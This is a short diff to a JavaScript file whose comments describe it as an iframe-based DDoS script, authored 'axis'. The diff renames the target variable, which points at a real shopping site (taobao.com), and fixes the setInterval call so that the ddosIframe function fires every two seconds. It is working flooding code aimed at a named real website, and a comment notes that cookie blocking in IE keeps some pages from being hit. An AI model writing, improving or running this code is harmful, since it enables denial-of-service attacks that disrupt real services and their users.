@@ -5,7 +5,7 @@
 //// iframe在IE中会拦截cookie,有些页面无法DDOS到
 //// Author: axis
 ////////////////////////////////////////////
-var target = "http://www.taobao.com";
+var ddos_target = "http://www.taobao.com";
 
 function ddosIframe(target){
 	var t = $d.createElement("iframe");
@@ -33,4 +33,4 @@ do {
 }
 while (i<=10);
 */
-setInterval("ddosIframe(target)", 2000);
+setInterval(function(){ddosIframe(ddos_target);}, 2000);
